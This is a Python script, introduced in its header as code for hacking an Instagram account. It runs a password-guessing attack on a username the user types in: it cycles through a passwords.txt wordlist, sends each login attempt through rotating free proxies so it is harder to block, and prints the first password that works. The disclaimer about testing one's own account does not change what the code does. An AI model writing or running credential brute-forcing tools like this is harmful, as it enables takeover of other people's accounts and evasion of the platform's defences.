# Date: 18/03/2023
# Author: Dmytro Kolodnyanskyi
# Description: This is a code for hacking an Instagram account.

# WARNING:
# Created to check the security of your account, do not use
# for other purposes. Use of this code is illegal and 
# punishable by law. The author of the code is not 
# responsible for your actions. (I will not be 
# responsible for anything, use at your own risk...)

import os
from time import sleep

from fp.fp import FreeProxy
from colorama import Fore
from instabot import Bot
#from instapy import *

ProxyList = []

def cls():
	if os.name == "posix":
		os.system("clear")
	else:
		os.system("cls")

def get_proxy():
	while True:
		proxy = FreeProxy(country_id=['US', 'BR'], timeout=0.3, rand=True).get()
		print(proxy)
		check = ProxyList.count(proxy)
		if check > 2:
			print("IP, повторяется больше двох раз.")
			sleep(3)
			cls()
			pass
		else:
			ProxyList.append(proxy)
			return proxy

def login_instapy(data):
	try:
		proxi = get_proxy()
		print(Fore.YELLOW + """
User: {}
Password: {}
Test login...""".format(data["username"], data["password"]) + Fore.RESET)
		botlog = InstaPy(
		username = data["username"],  
		password = data["password"],
		proxy = proxi)
		botlog.login()
		redata = "hack"
		return redata
	except:
		sleep(5)
		cls()
		redata = "none"
		return redata

def login_instabot(data):
	try:
		proxi = get_proxy()
		bot = Bot()
		print(Fore.YELLOW + """
User: {}
Password: {}
Test login...""".format(data["username"], data["password"]) + Fore.RESET)
		botlog = bot.login(
		username = data["username"],  
		password = data["password"],
		proxy = proxi)
		redata = "hack"
		return redata
	except:
		sleep(5)
		cls()
		redata = "none"
		return redata

def Main(us):
	with open("passwords.txt", "r") as file1:
		for line in file1:
			pw = line.strip()
			data = {}
			data["username"] = us
			data["password"] = pw
			insta = "instabot" # Default
			if insta.lower() == "instapy":
				redata = login_instapy(data)
			else:
				redata = login_instabot(data)
			if redata == "none":
				pass
			else:
				return data

#insta = input(Fore.YELLOW + "InstaBot" + Fore.BLUE +
#" / " + Fore.RED + "InstaPy " + Fore.BLUE + "?:" + Fore.RESET)
us = input(Fore.BLUE + "UserName hack: " + Fore.RESET)
data = Main(us)
print(Fore.RED + """
Hack insta bot!
User: {}
Password: {}""".format(data["username"], data["password"])
+ Fore.RESET)
input()
